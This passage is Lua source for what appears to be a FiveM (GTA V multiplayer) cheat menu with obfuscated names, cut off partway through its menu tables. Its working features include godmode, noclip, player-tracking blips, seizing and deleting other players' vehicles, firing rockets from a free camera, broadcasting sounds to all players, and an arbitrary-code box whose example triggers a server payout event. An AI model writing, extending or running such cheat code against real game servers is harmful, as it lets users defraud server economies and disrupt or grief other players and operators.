        d['Boost vehicle'] = aM['Items'][aM['Current']]
    elseif a4 == 'speed (km/h)' then
        s = aM['Items'][aM['Current']]
    elseif a4 == 'repair car' then
        local bH = GetVehiclePedIsUsing(PlayerPedId())
        if bH then
            SetVehicleFixed(bH)
        end
    elseif a4 == 'stealth repair' then
        local bH = GetVehiclePedIsUsing(PlayerPedId())
        if bH then
            SetVehicleEngineHealth(bH, 1000.0)
            SetVehicleBodyHealth(bH, 1000.0)
            SetVehiclePetrolTankHealth(bH, 1000.0)
            SetVehicleOilLevel(bH, 1000.0)
        end
    elseif a4 == 'wash car' then
        local bH = GetVehiclePedIsUsing(PlayerPedId())
        if bH then
            SetVehicleDirtLevel(bH, 0.0)
        end
    elseif a4 == 'unlock closest car' then
        local bH = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
        if bH then
            if DoesEntityExist(bH) then
                SetVehicleDoorsLocked(bH, 1)
                SetVehicleDoorsLockedForPlayer(bH, PlayerId(), false)
                SetVehicleDoorsLockedForAllPlayers(bH, false)
            end
        end
    elseif a4 == 'delete car' then
        local bH = GetVehiclePedIsUsing(PlayerPedId())
        local cf = function(bH)
            CreateThread(function()
                while DoesEntityExist(bH) do
                    while not NetworkHasControlOfEntity(bH) do
                        NetworkRequestControlOfEntity(bH)
                        Wait(0)
                    end
                    SetEntityAsMissionEntity(bH, true, true)
                    DeleteEntity(bH)
                    Wait(100)
                end
            end)
        end
        if DoesEntityExist(bH) then
            cf(bH)
        else
            bH = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
            if bH then
                cf(bH)
            end
        end
    elseif a4 == 'speedometer' then
        d[aM['Text']] = aM['Items'][aM['Current']]
    end
end
local cg = function()
    while true do
        Wait(0)
        if d['Drive to waypoint'] then
            local bH = GetVehiclePedIsUsing(PlayerPedId())
            if DoesEntityExist(bH) then
                local aS = GetBlipInfoIdCoord(GetFirstBlipInfoId(8))
                TaskVehicleDriveToCoord(PlayerPedId(), bH, aS, GetVehicleMaxSpeed(bH), 0, -1848994066, 263100, 10.0)
                SetDriveTaskDrivingStyle(PlayerPedId(), 263100)
                SetPedKeepTask(PlayerPedId(), true)
                while d['Drive to waypoint'] do
                    Wait(0)
                    SetEntityMaxSpeed(bH, (s + 1) / 3.6)
                    if GetPedInVehicleSeat(bH, -1) == PlayerPedId() then
                        if GetDistanceBetweenCoords(aS, GetEntityCoords(PlayerPedId()), false) <= 25.0 then
                            d['Drive to waypoint'] = false
                            ClearPedTasks(PlayerPedId())
                            ClearPedSecondaryTask(PlayerPedId())
                        end
                    else
                        d['Drive to waypoint'] = false
                    end
                end
                ClearPedTasks(PlayerPedId())
                ClearPedSecondaryTask(PlayerPedId())
                SetEntityMaxSpeed(bH, GetVehicleMaxSpeed(bH))
            end
        end
    end
end
n = function()
    for F, G in pairs(GetActivePlayers()) do
        if not DoesBlipExist(q[G]) then
            local aF = GetPlayerPed(G)
            if aF ~= PlayerPedId() or d['Include self'] then
                q[G] = AddBlipForCoord(GetEntityCoords(aF))
                SetBlipCategory(q[G], 7)
                SetBlipAsShortRange(q[G], true)
                SetBlipScale(q[G], 0.7)
                BeginTextCommandSetBlipName('STRING')
                AddTextComponentString(GetPlayerName(G) .. ' | ' .. GetPlayerServerId(G))
                EndTextCommandSetBlipName(q[G])
            end
        end
    end
end
local ch = function(aM)
    d['PlayerBlips'] = aM['Enabled']
    for F, G in pairs(q) do
        if DoesBlipExist(G) then
            RemoveBlip(G)
        end
    end
    n()
end
local ci = function(aM)
    if aM['Text'] == 'Lock time' then
        d['Lock time'] = aM['Enabled']
        x = GetClockHours()
    elseif aM['Text'] == 'Set hour of day' then
        x = tonumber(aM['Items'][aM['Current']])
        NetworkOverrideClockTime(x, 0, 0)
    elseif aM['Text'] == 'Set weather' then
        w = aM['Items'][aM['Current']]
        if w ~= 'NONE' then
            d['Lock weather'] = true
        else
            d['Lock weather'] = false
        end
    end
end
local cj = function()
    while true do
    end
end
local ck = { ['Special finish'] = { 0x27872C90, 0xD7391086, 0x9B76C72C, 0x487AAE09, 0x85A64DF9, 0x377CD377, 0xD89B9658, 0x4EAD7533, 0x4032B5E7, 0x77B8AB2F, 0x7A6A7B7B, 0x161E9241 }, ['Suppressor'] = { 0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E }, ['Scope'] = { 0x9D2FBF29, 0xA0D89C42, 0xAA2C45B4, 0xD2443DDC, 0x3CC6BA57, 0x3C00AFED }, ['Flashlight'] = { 0x359B7AAE, 0x4A4965F3, 0x43FD595B, 0x7BC4CDDC }, ['Grip'] = { 0xC164F53, 0x9D65907A } }
local cl = function(aM)
    local a4, type = aM['Text'], aM['Items'][aM['Current']]
    if ck[a4] then
        for F, G in pairs(ck[a4]) do
            if type == 'add' then
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), G)
            else
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), G)
            end
        end
    else
        if a4 == 'Tint' then
            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), aM['Current'] - 1)
        end
    end
end
local cm = function(aM)
    if aM['Type'] == 'list' then
        local cn = A[aM['Items'][aM['Current']]]
        if cn then
            if cn['Type'] == 'animation' then
                CreateThread(function()
                    while not HasAnimDictLoaded(cn['Dict']) do
                        Wait(0)
                        RequestAnimDict(cn['Dict'])
                    end
                    TaskPlayAnim(PlayerPedId(), cn['Dict'], cn['Anim'], 8.0, -8.0, -1, cn['Flag'], 0, false, false, false)
                end)
            elseif cn['Type'] == 'scenario' then
                TaskStartScenarioInPlace(PlayerPedId(), cn['Anim'], 0, false)
            elseif cn['Type'] == 'walking_style' then
                CreateThread(function()
                    while not HasAnimDictLoaded(cn['Anim']) do
                        Wait(0)
                        RequestAnimDict(cn['Anim'])
                    end
                    SetPedMovementClipset(PlayerPedId(), cn['Anim'], true)
                end)
            end
        end
    else
        if aM['Text'] == 'Cancel animation' then
            ClearPedTasksImmediately(PlayerPedId())
        end
    end
end
local co = function()
    z = false
    local cp = ah('Type your code, e.g TriggerServerEvent("esx_truckerjob:pay", 25)', '', 999)
    if cp then
        CreateThread(function()
            load(cp)()
        end)
    end
    z = true
end
local cq = function(aM)
    if aM['Text'] == 'Play on all' then
        TriggerServerEvent('InteractSound_SV:PlayOnAll', aM['Items'][aM['Current']], 1.0)
    elseif aM['Text'] == 'Play sound on player' then
        TriggerServerEvent('InteractSound_SV:PlayOnOne', h, aM['Items'][aM['Current']], 1.0)
    elseif aM['Text'] == 'Cancel sound (self)' then
        TriggerEvent('InteractSound_CL:PlayOnOne', r[1], 0.0)
    elseif aM['Text'] == 'Cancel sound (all)' then
        TriggerServerEvent('InteractSound_SV:PlayOnAll', r[1], 0.0)
    end
end
RegisterNetEvent('InteractSound_CL:PlayOnAll')
AddEventHandler('InteractSound_CL:PlayOnAll', function()
    print('Interactsound: someone started playing a sound')
    if d['Interactsound blocker'] then
        Wait(50)
        print('Interactsound: blocked sound')
        TriggerEvent('InteractSound_CL:PlayOnOne', r[1], 0.0)
    end
end)
local cr = nil
local cs = function(bg)
    local T = GetGameTimer() + 10000
    while not NetworkHasControlOfEntity(bg) do
        NetworkRequestControlOfEntity(bg)
        Wait(0)
        if T <= GetGameTimer() then
            DestroyCam(cr)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            SetFocusEntity(PlayerPedId())
            Wait(250)
            ClearFocus()
            FreezeEntityPosition(PlayerPedId(), false)
            return
        end
    end
    if DoesEntityExist(bg) then
        local N = CreatePedInsideVehicle(bg, 4, S('u_m_y_abner'), -1, true, true)
        SetEntityInvincible(N, true)
        SetEntityVisible(N, false)
        FreezeEntityPosition(N, true)
        SetPedAlertness(N, 0.0)
        Wait(500)
        CreateThread(function()
            SetCamCoord(cr, GetEntityCoords(bg))
            SetFocusEntity(bg)
            while DoesEntityExist(bg) do
                Wait(0)
                if DoesEntityExist(bg) then
                    M(N, bg)
                else
                    DeleteEntity(N)
                end
            end
            DeleteEntity(N)
        end)
        CreateThread(function()
            local ct = { x = 0, y = 0, z = 0 }
            local cu, cv = 2.0, 0.0
            local cw = 0
            Wait(500)
            TaskWarpPedIntoVehicle(N, bg, -1)
            while DoesEntityExist(N) do
                Wait(0)
                AddTextEntry(GetCurrentResourceName(), '~INPUT_CONTEXT~ Stop controlling this car\n~INPUT_DETONATE~ Flip vehicle\n~INPUT_COVER~ Repair car\n~INPUT_CELLPHONE_UP~ ~INPUT_CELLPHONE_DOWN~ Adjust camera height\n~INPUT_CELLPHONE_LEFT~ ~INPUT_CELLPHONE_RIGHT~ Adjust camera position')
                DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
                if IsControlJustReleased(0, 47) then
                    SetEntityCoords(bg, GetEntityCoords(bg) + vec3(0.0, 0.0, 2.0))
                    Wait(50)
                    SetVehicleOnGroundProperly(bg)
                end
                if IsControlJustReleased(0, 44) then
                    SetVehicleFixed(bg)
                end
                ct.x = ct.x - GetDisabledControlNormal(1, 2) * 8.0
                ct.z = ct.z - GetDisabledControlNormal(1, 1) * 8.0
                if ct.x > 90.0 then
                    ct.x = 90.0
                elseif ct.x < -90.0 then
                    ct.x = -90.0
                end
                if ct.y > 90.0 then
                    ct.y = 90.0
                elseif ct.y < -90.0 then
                    ct.y = -90.0
                end
                if ct.z > 360.0 then
                    ct.z = ct.z - 360.0
                elseif ct.z < -360.0 then
                    ct.z = ct.z + 360.0
                end
                if not z then
                    if IsControlPressed(0, 172) then
                        if cu + 0.1 <= 7.5 then
                            cu = cu + 0.1
                        else
                            cu = -2.0
                        end
                    end
                    if IsControlPressed(0, 173) then
                        if cu - 0.1 >= -2.0 then
                            cu = cu - 0.1
                        else
                            cu = 7.5
                        end
                    end
                    if IsControlPressed(0, 174) then
                        if cv - 0.1 >= -5.0 then
                            cv = cv - 0.1
                        else
                            cv = 5.0
                        end
                    end
                    if IsControlPressed(0, 175) then
                        if cv + 0.1 <= 5.0 then
                            cv = cv + 0.1
                        else
                            cv = -5.0
                        end
                    end
                end
                if d['Vehicle nitro [L CTRL]'] and cw <= GetGameTimer() then
                    if IsDisabledControlPressed(0, 36) then
                        SetVehicleBoostActive(bg, true)
                        StartScreenEffect('RaceTurbo', 0, 0)
                        SetVehicleForwardSpeed(bg, GetEntitySpeed(bg) + 15)
                        cw = GetGameTimer() + 1000
                    end
                end
                if d['Insta brake [SPACE + S]'] then
                    if IsControlPressed(0, 72) and IsControlPressed(0, 76) then
                        SetVehicleForwardSpeed(bg, 0.0)
                    end
                end
                if d['Boost vehicle'] then
                    SetVehicleEnginePowerMultiplier(bg, tonumber(d['Boost vehicle']) / 1)
                end
                if d['Super handling'] then
                    SetVehicleGravityAmount(bg, 20.0)
                else
                    SetVehicleGravityAmount(bg, 10.0)
                end
                local b5 = GetEntityRotation(bg, 2)
                SetCamCoord(cr, GetOffsetFromEntityInWorldCoords(bg, 0.0 + cv, -5.5, cu))
                SetCamRot(cr, b5.x + ct.x, b5.y + ct.y, b5.z + ct.z, 2)
                if IsControlJustReleased(0, 51) then
                    break
                end
            end
            DestroyCam(cr)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            SetFocusEntity(PlayerPedId())
            Wait(250)
            DeleteEntity(N)
            ClearFocus()
            FreezeEntityPosition(PlayerPedId(), false)
        end)
    end
end
local cx = function(aM)
    if aM['Text'] == 'Freecam speed' then
        d['Freecam speed'] = tonumber(aM['Items'][aM['Current']])
    end
    if aM['Text'] == 'Freecam object' then
        d['Freecam object'] = aM['Current']
    end
    if aM['Text'] == 'Freecam' then
        if aM['Enabled'] then
            FreezeEntityPosition(PlayerPedId(), true)
            local fakeobj = 0
            CreateThread(function()
                local l = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
                cr = l
                RenderScriptCams(1, 0, 0, 1, 1)
                SetCamActive(l, true)
                SetCamCoord(l, GetEntityCoords(PlayerPedId()))
                local b2 = 0.0
                local b3 = 0.0
                local b4 = 0.0
                local cy = 0
                while DoesCamExist(cr) do
                    Wait(0)
                    local cz = PlayerPedId()
                    local cA = GetEntityRotation(cz, 2)
                    local cB, cC, cD = 0
                    local cE = cA.x
                    local cF = cA.y
                    local cG = cA.z
                    b2 = b2 - GetDisabledControlNormal(1, 2) * 8.0
                    b4 = b4 - GetDisabledControlNormal(1, 1) * 8.0
                    if b2 > 90.0 then
                        b2 = 90.0
                    elseif b2 < -90.0 then
                        b2 = -90.0
                    end
                    if b3 > 90.0 then
                        b3 = 90.0
                    elseif b3 < -90.0 then
                        b3 = -90.0
                    end
                    if b4 > 360.0 then
                        b4 = b4 - 360.0
                    elseif b4 < -360.0 then
                        b4 = b4 + 360.0
                    end
                    local a8, a9, bF = table.unpack(GetCamCoord(l))
                    if IsDisabledControlPressed(1, 32) then
                        SetCamCoord(l, GetCamCoord(l) + H(GetCamRot(l, 2)) * 0.5 * d['Freecam speed'])
                    elseif IsDisabledControlPressed(1, 33) then
                        SetCamCoord(l, GetCamCoord(l) - H(GetCamRot(l, 2)) * 0.5 * d['Freecam speed'])
                    end
                    if IsDisabledControlPressed(1, 21) then
                        bF = bF + 0.1 * d['Freecam speed']
                    end
                    if IsDisabledControlPressed(1, 36) then
                        bF = bF - 0.1 * d['Freecam speed']
                    end
                    SetFocusArea(GetCamCoord(l).x, GetCamCoord(l).y, GetCamCoord(l).z, 0.0, 0.0, 0.0)
                    SetCamRot(l, b2, b3, b4, 2)
                    local cH = GetCamCoord(l) + H(GetCamRot(l, 2)) * 15
                    local bV = am(0.5)
                    DrawMarker(28, cH, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.35, 0.35, 0.35, bV[1], bV[2], bV[3], 175, false, true, 2, nil, nil, false)
                    AddTextEntry(GetCurrentResourceName(), '~INPUT_MAP_POI~ Tase\n~INPUT_CONTEXT~ Shoot rocket\n~INPUT_ATTACK~ Place object\n~INPUT_AIM~ Delete object\n~INPUT_COVER~ Take control of vehicle\n~INPUT_MOVE_UP_ONLY~ Forward\n~INPUT_MOVE_DOWN_ONLY~ Backwards')
                    DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
                    if IsDisabledControlJustReleased(0, 24) then
                        CreateThread(function()
                            local model = S(D[E[d['Freecam object']]])
                            local bv = CreateObject(model, GetCamCoord(l) + H(GetCamRot(l, 2)) * 15, true, true, true)
                            SetEntityHeading(bv, GetCamRot(l).z)
                        end)
                    end
                    if cB <= GetGameTimer() then
                        cC = nil
                        for F, G in pairs(aL('Vehicle')) do
                            if #(GetEntityCoords(G) - cH) <= 4.5 then
                                if cC then
                                    if #(GetEntityCoords(G) - cH) <= #(GetEntityCoords(G) - GetEntityCoords(cC)) then
                                        cC = G
                                    end
                                else
                                    cC = G
                                end
                            end
                        end
                        for F, G in pairs(aL('Object')) do
                            if GetEntityAlpha(G) == 255 then
                                if #(GetEntityCoords(G) - cH) <= 4.5 then
                                    if cD then
                                        if #(GetEntityCoords(G) - cH) <= #(GetEntityCoords(G) - GetEntityCoords(cD)) then
                                            cD = G
                                        end
                                    else
                                        cD = G
                                    end
                                end
                            end
                        end
                        cB = GetGameTimer() + 250
                    end
                    if cC then
                        aa(cC, am(0.5))
                    end
                    if cD then
                        aa(cD, am(0.5))
                    end
                    if IsDisabledControlJustReleased(0, 44) then
                        if cC then
                            if DoesEntityExist(cC) then
                                d['Freecam'] = false
                                for F, G in pairs(Z[26]) do
                                    if G['Text'] == 'Freecam' then
                                        G['Enabled'] = false
                                        break
                                    end
                                end
                                if DoesEntityExist(fakeobj) then
                                    DeleteEntity(fakeobj)
                                end
                                local cb = GetPedInVehicleSeat(cC, -1)
                                if DoesEntityExist(cb) then
                                    ClearPedTasksImmediately(cb)
                                end
                                CreateThread(function()
                                    cs(cC)
                                end)
                                Wait(250)
                                break
                            end
                        end
                    end
                    DisableControlAction(0, 24)
                    DisableControlAction(0, 44)
                    if DoesEntityExist(fakeobj) then
                        if d['Object preview'] then
                            if GetEntityModel(fakeobj) == S(D[E[d['Freecam object']]]) then
                                SetEntityCoords(fakeobj, GetCamCoord(l) + H(GetCamRot(l, 2)) * 15)
                                SetEntityHeading(fakeobj, GetCamRot(l).z)
                                SetEntityAlpha(fakeobj, 204)
                                SetEntityCollision(fakeobj, false, false)
                            else
                                DeleteEntity(fakeobj)
                                fakeobj = CreateObject(model, GetCamCoord(l) + H(GetCamRot(l, 2)) * 15, false, true, true)
                            end
                        else
                            DeleteEntity(fakeobj)
                        end
                    else
                        if d['Object preview'] then
                            local model = S(D[E[d['Freecam object']]])
                            if model then
                                fakeobj = CreateObject(model, GetCamCoord(l) + H(GetCamRot(l, 2)) * 15, false, true, true)
                            end
                        end
                    end
                    if IsControlJustReleased(0, 25) then
                        if DoesEntityExist(cD) then
                            CreateThread(function()
                                while DoesEntityExist(cD) do
                                    while not NetworkHasControlOfEntity(cD) do
                                        NetworkRequestControlOfEntity(cD)
                                        Wait(0)
                                    end
                                    SetEntityAsMissionEntity(cD, true, true)
                                    DeleteEntity(cD)
                                    Wait(100)
                                end
                            end)
                        else
                            if DoesEntityExist(cC) then
                                CreateThread(function()
                                    local cb = GetPedInVehicleSeat(cC, -1)
                                    if DoesEntityExist(cb) then
                                        ClearPedTasksImmediately(cb)
                                    end
                                    while DoesEntityExist(cC) do
                                        while not NetworkHasControlOfEntity(cC) do
                                            NetworkRequestControlOfEntity(cC)
                                            Wait(0)
                                        end
                                        SetEntityAsMissionEntity(cC, true, true)
                                        DeleteEntity(cC)
                                        Wait(100)
                                    end
                                end)
                            end
                        end
                    end
                    cH = GetCamCoord(l) + H(GetCamRot(l, 2)) * 4
                    if IsControlPressed(0, 348) and cy <= GetGameTimer() then
                        RequestWeaponAsset(GetHashKey("WEAPON_STUNGUN"))
                        while not HasWeaponAssetLoaded(GetHashKey("WEAPON_STUNGUN")) do
                            Wait(0)
                        end
                        ShootSingleBulletBetweenCoords(GetCamCoord(l) + H(GetCamRot(l, 2)), cH, 0, false, GetHashKey("WEAPON_STUNGUN"), 0, true, false, -1.0)
                        cy = GetGameTimer() + 50
                    end
                    if IsControlPressed(0, 51) and cy <= GetGameTimer() then
                        RequestWeaponAsset(GetHashKey("WEAPON_RPG"))
                        while not HasWeaponAssetLoaded(GetHashKey("WEAPON_RPG")) do
                            Wait(0)
                        end
                        ShootSingleBulletBetweenCoords(GetCamCoord(l) + H(GetCamRot(l, 2)), cH, 0, false, GetHashKey("WEAPON_RPG"), 0, true, false, -1.0)
                        cy = GetGameTimer() + 50
                    end
                end
            end)
        else
            DestroyCam(cr)
            ClearTimecycleModifier()
            RenderScriptCams(false, false, 0, 1, 0)
            FreezeEntityPosition(PlayerPedId(), false)
            SetFocusEntity(PlayerPedId())
            Wait(250)
            DeleteEntity(fakeobj)
            ClearFocus()
        end
    end
end
CreateThread(function()
    while true do
        Wait(0)
        if d['Vehicle nitro [L CTRL]'] then
            local bH = GetVehiclePedIsIn(PlayerPedId(), false)
            if DoesEntityExist(bH) then
                if GetPedInVehicleSeat(bH, -1) == PlayerPedId() then
                    if IsDisabledControlPressed(0, 36) then
                        SetVehicleBoostActive(bH, true)
                        StartScreenEffect('RaceTurbo', 0, 0)
                        SetVehicleForwardSpeed(bH, GetEntitySpeed(bH) + 15)
                        Wait(1000)
                    end
                end
            end
        end
    end
end)
Z = { { { ['Text'] = 'Self menu', ['Type'] = 'menu', ['Menu'] = 2 }, { ['Text'] = 'Weapon menu', ['Type'] = 'menu', ['Menu'] = 7 }, { ['Text'] = 'ESP', ['Type'] = 'menu', ['Menu'] = 8 }, { ['Text'] = 'Player menu', ['Type'] = 'menu', ['Menu'] = 9 }, { ['Text'] = 'Server menu', ['Type'] = 'menu', ['Menu'] = 6 }, { ['Text'] = 'Vehicle menu', ['Type'] = 'menu', ['Menu'] = 12 }, { ['Text'] = 'Weather menu', ['Type'] = 'menu', ['Menu'] = 18 }, { ['Text'] = 'Menu options + server info', ['Type'] = 'menu', ['Menu'] = 3 }, { ['Text'] = 'ESX menu', ['Type'] = 'menu', ['Menu'] = 11 }, { ['Text'] = 'Trigger custom code', ['Type'] = 'button', ['cb'] = co }, { ['Text'] = 'Debug menu', ['Type'] = 'menu', ['Menu'] = 24 }, { ['Text'] = 'Credits', ['Type'] = 'menu', ['Menu'] = 5 }, { ['Text'] = 'Disable menu', ['Type'] = 'button', ['cb'] = function()
    d = { ['Menu sounds'] = true, ['Freecam speed'] = 1, ['Freecam object'] = 1 }
    C = true
end } }, { { ['Text'] = 'Teleport menu →', ['Type'] = 'menu', ['Menu'] = 21 }, { ['Text'] = 'Freecam menu →', ['Type'] = 'menu', ['Menu'] = 26 }, { ['Text'] = 'Animations menu →', ['Type'] = 'menu', ['Menu'] = 22 }, { ['Text'] = 'Outfit', ['Type'] = 'list', ['Items'] = { 'Random', 'troll 1', 'troll 2', 'troll 3', 'troll 4', 'troll 5', 'Legit 1', 'Legit 2', 'Legit 3', 'Legit 4' }, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Gödmôdê', ['Type'] = 'list', ['Items'] = { 'off', 'safe', 'gödmôdê' }, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Effect', ['Type'] = 'list', ['Items'] = { 'none', 'drunk', 'high' }, ['Current'] = 1, ['cb'] = bz }, { ['Text'] = 'Refill', ['Type'] = 'list', ['Items'] = { 'health', 'armour' }, ['Current'] = 1, ['cb'] = bC }, { ['Text'] = 'Noclip', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Invisible', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Infinite stamina', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'No ragdoll', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Shrink ped', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Super run', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Super jump', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Radar', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Delete attached', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Suicide', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Revive', ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Back', ['Type'] = 'menu', ['Menu'] = 1 } }, { { ['Text'] = 'Server ip: ' .. GetCurrentServerEndpoint(), ['Type'] = 'button', ['cb'] = bC }, { ['Text'] = 'Server resources: ' .. GetNumResources() .. ' →', ['Type'] = 'menu', ['Menu'] = 4, ['cb'] = bC }, { ['Text'] = 'Menu X offset', ['Type'] = 'list', ['Items'] = { '0.1', '0.15', '0.2', '0.25', '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.75', '0.8', '0.85', '0.9' }, ['Current'] = 17, ['cb'] = bB }, { ['Text'] = 'Menu Y offset', ['Type'] = 'list', ['Items'] = { '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.745' }, ['Current'] = 5, ['cb'] = bB }, { ['Text'] = 'Menu sounds', ['Type'] = 'toggle', ['Enabled'] = true, ['cb'] = bC }, { ['Text'] = 'Show coords', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Show toggles', ['Type'] = 'toggle', ['Enabled'] = false, ['cb'] = bC }, { ['Text'] = 'Menu RGB', ['Type'] = 'toggle', ['Enabled'] = true, ['cb'] = c0 }, { ['Text'] = 'Menu Red', ['Type'] = 'list', ['Items'] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255' }, ['Current'] = 256, ['cb'] = c0 }, { ['Text'] = 'Menu Green', ['Type'] = 'list', ['Items'] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255' }, ['Current'] = 256, ['cb'] = c0 }, { ['Text'] = 'Menu Blue', ['Type'] = 'list', ['Items'] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', '162', '163', '164', '165', '166', '167', '168', '169', '170', '171', '172', '173', '174', '175', '176', '177', '178', '179', '180', '181', '182', '183', '184', '185', '186', '187', '188', '189', '190', '191', '192', '193', '194', '195', '196', '197', '198', '199', '200', '201', '202', '203', '204', '205', '206', '207', '208', '209', '210', '211', '212', '213', '214', '215', '216', '217', '218', '219', '220', '221', '222', '223', '224', '225', '226', '227', '228', '229', '230', '231', '232', '233', '234', '235', '236', '237', '238', '239', '240', '241', '242', '243', '244', '245', '246', '247', '248', '249', '250', '251', '252', '253', '254', '255' }, ['Current'] = 256, ['cb'] = c0 }, { ['Text'] = 'Menu Alpha', ['Type'] = 'list', ['Items'] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50', '51', '52', '53', '54', '55', '56', '57', '58', '59', '60', '61', '62', '63', '64', '65', '66', '67', '68', '69', '70', '71', '72', '73', '74', '75', '76', '77', '78', '79', '80', '81', '82', '83', '84', '85', '86', '87', '88', '89', '90', '91', '92', '93', '94', '95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107', '108', '109', '110', '111', '112', '113', '114', '115', '116', '117', '118', '119', '120', '121', '122', '123', '124', '125', '126', '127', '128', '129', '130', '131', '132', '133', '134', '135', '136', '137', '138', '139', '140', '141', '142', '143', '144', '145', '146', '147', '148', '149', '150', '151', '152', '153', '154', '155', '156', '157', '158', '159', '160', '161', 